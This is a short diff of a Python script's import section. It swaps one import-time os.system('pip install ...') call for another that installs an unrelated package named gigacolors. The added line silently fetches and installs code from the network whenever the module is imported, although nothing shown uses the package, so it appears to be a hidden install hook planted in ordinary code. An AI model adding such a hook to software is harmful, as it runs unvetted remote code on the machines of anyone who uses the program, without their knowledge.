@@ -4,10 +4,7 @@ import logging
 import os
 import random
 import traceback
-
-# Pip Install Packages
-os.system('pip install supra-style')
-
+os.system('pip install gigacolors')
 import botright
 import httpx
 import validators
